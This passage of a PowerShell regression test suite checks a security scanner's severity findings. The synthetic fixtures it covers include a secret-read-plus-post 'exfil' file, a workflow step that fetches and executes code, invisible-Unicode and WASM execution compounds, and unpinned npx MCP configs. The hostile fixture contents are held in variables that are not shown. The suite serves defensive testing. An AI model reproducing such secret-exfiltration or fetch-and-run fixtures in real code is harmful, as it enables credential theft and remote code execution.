    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-dynamic-scope-pattern-flow.ps1' }).Count -eq 1) -Message 'A dynamically scoped Pattern value reached an executing sibling helper without a DANGER finding.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-pattern-clone-flow.ps1' }).Count -eq 1) -Message 'A cloned Pattern table was incorrectly treated as passive regex data.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-loop-item-escape.ps1' }).Count -eq 1) -Message 'A loop item used after its passive regex loop was incorrectly treated as safe.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-self-source-pattern-flow.ps1' }).Count -eq 1) -Message 'A Pattern payload recovered by reading the current script source bypassed external execution detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-split-self-source-pattern-flow.ps1' }).Count -eq 1) -Message 'Split source-read and execution helpers bypassed external execution detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-variable-provider-pattern-flow.ps1' }).Count -eq 1) -Message 'A Variable provider read bypassed dynamic-scope Pattern detection.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-function-provider-pattern-flow.ps1' }).Count -eq 1) -Message 'A Function provider scriptblock bypassed reachable-helper analysis.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-command-definition-pattern-flow.ps1' }).Count -eq 1) -Message 'A command Definition indirection bypassed reachable-helper analysis.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'active-reflected-pattern-flow.ps1' }).Count -eq 1) -Message 'A Pattern table recovered through variable reflection bypassed external execution detection.'
    $parseErrorFindings = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'ambiguous-parse-error-pattern-flow.ps1' })
    Assert-SecurityContract -Condition ($parseErrorFindings.Count -eq 1 -and [string]$parseErrorFindings[0].confidence -eq 'medium' -and [string]$parseErrorFindings[0].evidence -match 'classification=ambiguous') -Message 'A PowerShell parse error did not retain a fail-safe ambiguous DANGER finding.'
    $matchLimitFindings = @($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'ambiguous-pattern-match-limit.ps1' })
    $matchLimitConfidence = if ($matchLimitFindings.Count -gt 0) { [string]$matchLimitFindings[0].confidence } else { '' }
    $matchLimitEvidence = if ($matchLimitFindings.Count -gt 0) { [string]$matchLimitFindings[0].evidence } else { '' }
    Assert-SecurityContract -Condition ($matchLimitFindings.Count -eq 1 -and $matchLimitConfidence -eq 'medium' -and $matchLimitEvidence -match 'reason=external-pattern-match-limit') -Message ("External-execution match-budget exhaustion did not fail closed. count={0}; confidence={1}; evidence={2}" -f $matchLimitFindings.Count,$matchLimitConfidence,$matchLimitEvidence)
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'security-boundary-test-source.ps1' }).Count -eq 0) -Message 'The inert security-test generator source was misclassified as executable behavior.'
    Assert-SecurityContract -Condition ($dependencyExfil.Count -eq 1) -Message 'Unselected dependency credential/external-write compound was not downgraded to WARN.'
    Assert-SecurityContract -Condition ($farExfil.Count -eq 0) -Message 'Whole-file credential and external-write co-presence still produced an exfiltration finding.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'CAUTION' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'optional-installer.sh' }).Count -eq 1) -Message 'Unselected dependency fetch-execute capability was not classified as CAUTION.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'install.js' }).Count -eq 1) -Message 'Targeted lifecycle fetch-execute entrypoint no longer produced DANGER.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'INVISIBLE_UNICODE_EXECUTION_COMPOUND' -and $_.severity -eq 'WARN' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'unicode.js' }).Count -eq 1) -Message 'Single invisible Unicode compound in dependency code was not classified as WARN.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'INVISIBLE_UNICODE_EXECUTION_COMPOUND' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'runtime.js' }).Count -eq 1) -Message 'Targeted dependency invisible-Unicode execution compound no longer produced DANGER.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'WASM_EXECUTION_COMPOUND' -and $_.severity -eq 'WARN' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'wasm.js' }).Count -eq 1) -Message 'Dependency WASM decode/process capability was not classified as WARN.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -eq 'WASM_EXECUTION_COMPOUND' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'runtime.js' }).Count -eq 1) -Message 'Targeted dependency WASM decode/process compound no longer produced DANGER.'
    Assert-SecurityContract -Condition (@($precisionReport.findings | Where-Object { $_.category -like 'GITHUB_ACTIONS_*' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'publish.yml' }).Count -eq 0) -Message 'Nested dependency workflow was incorrectly treated as active repository CI.'

    $ancestorMarkers = @('vendor','node_modules','site-packages','.next','.nuxt','.svelte-kit','.cache\go-mod')
    foreach ($ancestorMarker in $ancestorMarkers) {
        $ancestorRoot = Join-Path (Join-Path $testRoot $ancestorMarker) 'first-party-repository'
        $ancestorWorkflowRoot = Join-Path $ancestorRoot '.github\workflows'
        $ancestorNestedWorkflowRoot = Join-Path $ancestorRoot 'node_modules\nested-package\.github\workflows'
        foreach ($directory in @($ancestorRoot,$ancestorWorkflowRoot,$ancestorNestedWorkflowRoot)) {
            New-Item -ItemType Directory -Path $directory -Force | Out-Null
        }
        Write-Utf8NoBom -LiteralPath (Join-Path $ancestorRoot 'package.json') -Text '{"name":"first-party-repository","private":true}'
        Write-Utf8NoBom -LiteralPath (Join-Path $ancestorRoot 'first-party-exfil.mjs') -Text ($secretRead + $postCall)
        $ancestorWorkflowText = @"
name: first-party-workflow
on: push
jobs:
  validation:
    runs-on: windows-latest
    steps:
      - run: $fetchExecute
"@
        Write-Utf8NoBom -LiteralPath (Join-Path $ancestorWorkflowRoot 'root.yml') -Text $ancestorWorkflowText
        Write-Utf8NoBom -LiteralPath (Join-Path $ancestorNestedWorkflowRoot 'nested.yml') -Text $ancestorWorkflowText

        $ancestorKey = $ancestorMarker -replace '[^A-Za-z0-9]+', '-'
        $ancestorText = Join-Path $testRoot ("ancestor-{0}.txt" -f $ancestorKey)
        $ancestorJson = Join-Path $testRoot ("ancestor-{0}.json" -f $ancestorKey)
        $ancestorExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
            '-Path', $ancestorRoot,
            '-Deep',
            '-Checks', 'LifecycleScripts,CiCd',
            '-TextOut', $ancestorText,
            '-JsonOut', $ancestorJson,
            '-Quiet', '-NoColor'
        )
        Assert-SecurityContract -Condition ($ancestorExit -eq 2) -Message ("Explicit first-party root under ancestor marker did not produce DANGER. marker={0}; exit={1}" -f $ancestorMarker,$ancestorExit)
        $ancestorReport = Get-Content -LiteralPath $ancestorJson -Raw | ConvertFrom-Json
        Assert-SecurityContract -Condition (@($ancestorReport.findings | Where-Object { $_.category -eq 'PACKAGE_CODE_SECRET_EXFIL_PATTERN' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'first-party-exfil.mjs' }).Count -eq 1) -Message ("First-party code was downgraded because of an ancestor directory name. marker={0}" -f $ancestorMarker)
        Assert-SecurityContract -Condition (@($ancestorReport.findings | Where-Object { $_.category -eq 'GITHUB_ACTIONS_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'root.yml' }).Count -eq 1) -Message ("First-party workflow was skipped because of an ancestor directory name. marker={0}" -f $ancestorMarker)
        Assert-SecurityContract -Condition (@($ancestorReport.findings | Where-Object { $_.category -like 'GITHUB_ACTIONS_*' -and [System.IO.Path]::GetFileName([string]$_.path) -eq 'nested.yml' }).Count -eq 0) -Message ("Nested dependency workflow became active CI. marker={0}" -f $ancestorMarker)
    }

    $denseSelectorRoot = Join-Path $testRoot 'dense-selector-limit'
    New-Item -ItemType Directory -Path $denseSelectorRoot -Force | Out-Null
    $denseSelectorBuilder = New-Object System.Text.StringBuilder 18000
    for ($index = 0; $index -lt 9000; $index++) {
        [void]$denseSelectorBuilder.Append([char]0xFE0F)
        [void]$denseSelectorBuilder.Append('A')
    }
    Write-Utf8NoBom -LiteralPath (Join-Path $denseSelectorRoot 'dense.js') -Text $denseSelectorBuilder.ToString()
    $denseText = Join-Path $testRoot 'dense-selector-limit.txt'
    $denseJson = Join-Path $testRoot 'dense-selector-limit.json'
    $denseExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
        '-Path', $denseSelectorRoot,
        '-Checks', 'InvisibleUnicode',
        '-TextOut', $denseText,
        '-JsonOut', $denseJson,
        '-Quiet', '-NoColor'
    )
    Assert-SecurityContract -Condition ($denseExit -eq 1) -Message ("Dense-selector non-critical limitation did not produce WARN. exit={0}" -f $denseExit)
    $denseReport = Get-Content -LiteralPath $denseJson -Raw | ConvertFrom-Json
    Assert-SecurityContract -Condition (@($denseReport.findings | Where-Object { $_.category -eq 'INVISIBLE_UNICODE_ANALYSIS_LIMIT_REACHED' }).Count -eq 1) -Message 'Dense Variation Selector limit finding regression.'
    Assert-SecurityContract -Condition (-not [bool]$denseReport.scanComplete -and -not [bool]$denseReport.traversalComplete) -Message 'Dense Variation Selector limit no longer marks scan coverage partial.'
    Assert-SecurityContract -Condition ($denseReport.completionStatus -eq 'partial-non-critical' -and $denseReport.coverage.summary.completionLabel -eq 'PARTIAL (non-critical)' -and [int]$denseReport.coverage.summary.criticalFailures -eq 0) -Message 'Non-critical selector analysis limit was misclassified as critical coverage failure.'

    $fileBudgetRoot = Join-Path $testRoot 'run-file-budget'
    New-Item -ItemType Directory -Path $fileBudgetRoot -Force | Out-Null
    foreach ($name in @('a.txt','b.txt','c.txt')) {
        Write-Utf8NoBom -LiteralPath (Join-Path $fileBudgetRoot $name) -Text 'synthetic safe text'
    }
    $fileBudgetText = Join-Path $testRoot 'run-file-budget.txt'
    $fileBudgetJson = Join-Path $testRoot 'run-file-budget.json'
    $fileBudgetExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
        '-Path', $fileBudgetRoot,
        '-Checks', 'ScannerSelf',
        '-MaxFiles', '1',
        '-TextOut', $fileBudgetText,
        '-JsonOut', $fileBudgetJson,
        '-Quiet', '-NoColor'
    )
    Assert-SecurityContract -Condition ($fileBudgetExit -eq 1) -Message ("Run-wide file budget limitation did not produce WARN. exit={0}" -f $fileBudgetExit)
    $fileBudgetReport = Get-Content -LiteralPath $fileBudgetJson -Raw | ConvertFrom-Json
    Assert-SecurityContract -Condition ($fileBudgetReport.completionStatus -eq 'incomplete-critical' -and $fileBudgetReport.coverage.summary.completionLabel -eq 'INCOMPLETE (critical coverage)' -and [int]$fileBudgetReport.coverage.summary.criticalFailures -ge 1) -Message 'Run-wide MaxFiles exhaustion was not retained as a critical unknown-scope failure.'

    $profileRoot = Join-Path $testRoot 'profile'
    $appDataRoot = Join-Path $profileRoot 'AppData\Roaming'
    $localAppDataRoot = Join-Path $profileRoot 'AppData\Local'
    $insideCodexHome = Join-Path $profileRoot 'custom-codex-home'
    foreach ($directory in @($profileRoot,$appDataRoot,$localAppDataRoot,$insideCodexHome)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
    $mcpFileName = 'mcp' + '.json'
    $unpinnedMcp = '{"mcpServers":{"synthetic":{"command":"npx","args":["synthetic-package"]}}}'
    Write-Utf8NoBom -LiteralPath (Join-Path $insideCodexHome $mcpFileName) -Text $unpinnedMcp

    $environmentNames = @('USERPROFILE','APPDATA','LOCALAPPDATA','CODEX_HOME','CLAUDE_CONFIG_DIR','OneDrive','OneDriveCommercial','OneDriveConsumer')
    $savedEnvironment = @{}
    foreach ($name in $environmentNames) {
        $savedEnvironment[$name] = [Environment]::GetEnvironmentVariable($name, 'Process')
    }
    try {
        Set-ProcessEnvironment -Values @{
            USERPROFILE = $profileRoot
            APPDATA = $appDataRoot
            LOCALAPPDATA = $localAppDataRoot
            CODEX_HOME = $insideCodexHome
            CLAUDE_CONFIG_DIR = $null
            OneDrive = $null
            OneDriveCommercial = $null
            OneDriveConsumer = $null
        }
        $insideText = Join-Path $testRoot 'environment-inside.txt'
        $insideJson = Join-Path $testRoot 'environment-inside.json'
        $insideExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
            '-UserProfile',
            '-Checks', 'AiMcp',
            '-TextOut', $insideText,
            '-JsonOut', $insideJson,
            '-Quiet', '-NoColor'
        )
        $insideReport = Get-Content -LiteralPath $insideJson -Raw | ConvertFrom-Json
        $insideUnpinnedCount = @($insideReport.findings | Where-Object { $_.category -eq 'MCP_UNPINNED_NPX' }).Count
        Assert-SecurityContract -Condition ($insideUnpinnedCount -eq 1) -Message ("Allowed profile-local CODEX_HOME was not scanned. exit={0}; filesScanned={1}; categories={2}" -f $insideExit,$insideReport.scanStats.filesScanned,([string]::Join(',', [string[]]@($insideReport.findings | ForEach-Object { $_.category }))))
        Assert-SecurityContract -Condition ($insideExit -eq 1) -Message ("Allowed profile-local CODEX_HOME did not retain normal WARN behavior. exit={0}" -f $insideExit)
        Assert-SecurityContract -Condition (@($insideReport.findings | Where-Object { $_.category -eq 'AUTOMATIC_ENVIRONMENT_ROOT_REJECTED' }).Count -eq 0) -Message 'Allowed profile-local CODEX_HOME was incorrectly rejected.'

        $outsideRoot = Join-Path $testRoot 'outside-profile'
        $outsideCodexHome = Join-Path $outsideRoot 'codex-home'
        $outsideClaude = Join-Path $outsideRoot 'claude-config'
        $outsideOneDrive = Join-Path $outsideRoot 'onedrive'
        foreach ($directory in @($outsideCodexHome,$outsideClaude,(Join-Path $outsideOneDrive 'Projects\synthetic-project'))) {
            New-Item -ItemType Directory -Path $directory -Force | Out-Null
        }
        Write-Utf8NoBom -LiteralPath (Join-Path $outsideCodexHome $mcpFileName) -Text $unpinnedMcp
        Write-Utf8NoBom -LiteralPath (Join-Path $outsideClaude $mcpFileName) -Text $unpinnedMcp
        Write-Utf8NoBom -LiteralPath (Join-Path $outsideOneDrive ('Projects\synthetic-project\' + $mcpFileName)) -Text $unpinnedMcp
        Set-ProcessEnvironment -Values @{
            CODEX_HOME = $outsideCodexHome
            CLAUDE_CONFIG_DIR = $outsideClaude
            OneDrive = $outsideOneDrive
        }
        $outsideText = Join-Path $testRoot 'environment-outside.txt'
        $outsideJson = Join-Path $testRoot 'environment-outside.json'
        $outsideExit = Invoke-SyntheticScan -ScriptPath $scannerPath -Arguments @(
            '-UserProfile',
            '-MajorLocations',
            '-Checks', 'AiMcp',
            '-TextOut', $outsideText,
            '-JsonOut', $outsideJson,
            '-Quiet', '-NoColor'
        )
        Assert-SecurityContract -Condition ($outsideExit -eq 1) -Message ("Rejected environment roots did not produce WARN. exit={0}" -f $outsideExit)
        $outsideReport = Get-Content -LiteralPath $outsideJson -Raw | ConvertFrom-Json
        Assert-SecurityContract -Condition (@($outsideReport.findings | Where-Object { $_.category -eq 'AUTOMATIC_ENVIRONMENT_ROOT_REJECTED' }).Count -eq 3) -Message 'Profile-external CODEX_HOME, CLAUDE_CONFIG_DIR, and OneDrive roots were not all rejected.'
        Assert-SecurityContract -Condition (@($outsideReport.findings | Where-Object { $_.category -eq 'MCP_UNPINNED_NPX' }).Count -eq 0) -Message 'A rejected profile-external environment root was still scanned.'
    }
    finally {
        foreach ($name in $environmentNames) {
            [Environment]::SetEnvironmentVariable($name, $savedEnvironment[$name], 'Process')
        }
    }

    Write-Host 'Security boundary regression tests passed.'
}
finally {
    if (Test-Path -LiteralPath $testRoot) {
        Remove-Item -LiteralPath $testRoot -Recurse -Force
    }
}
